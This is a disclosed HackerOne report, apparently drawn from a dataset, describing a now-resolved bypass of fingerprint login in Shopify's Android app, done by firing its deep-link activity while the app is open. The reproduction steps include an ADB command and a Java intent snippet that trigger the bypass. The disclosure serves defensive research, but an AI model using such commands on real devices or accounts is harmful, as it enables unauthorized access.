---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '637194'
original_report_id: '637194'
title: Bypass of biometrics security functionality is possible in Android application
  (com.shopify.mobile)
weakness: Improper Authentication - Generic
team_handle: shopify
created_at: '2019-07-07T15:03:49.294Z'
disclosed_at: '2019-08-14T13:08:47.279Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 77
asset_identifier: com.shopify.mobile
asset_type: GOOGLE_PLAY_APP_ID
max_severity: medium
tags:
- hackerone
- improper-authentication-generic
---

# Bypass of biometrics security functionality is possible in Android application (com.shopify.mobile)

## Metadata

- HackerOne Report ID: 637194
- Weakness: Improper Authentication - Generic
- Program: shopify
- Disclosed At: 2019-08-14T13:08:47.279Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

# Summary
Shopify Android App has an option to sign in to the app using fingerprint. But if the application was open and someone triggers a "deeplink", authentication is no longer required.

## Step to Reproduce
{F523700}
Link: [Shopify Help Center - Topics - Products](https://help.shopify.com/en/manual/products)

NOTE¹: The application must be **open** when triggered `com.shopify.mobile.lib.app.DeepLinkActivity`.
NOTE²: It is also possible via ADB and Java (Android App):
`adb shell am start -n com.shopify.mobile/com.shopify.mobile.lib.app.DeepLinkActivity -d 'https://www.shopify.com/admin/products'`
```java
Intent intent = new Intent();
intent.setClassName("com.shopify.mobile", "com.shopify.mobile.lib.app.DeepLinkActivity");
intent.setData(Uri.parse("https://www.shopify.com/admin/products")); 
startActivity(intent);
```

My environment information:
{F523698} {F523699}

## Impact

Unauthorized access to use the application.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
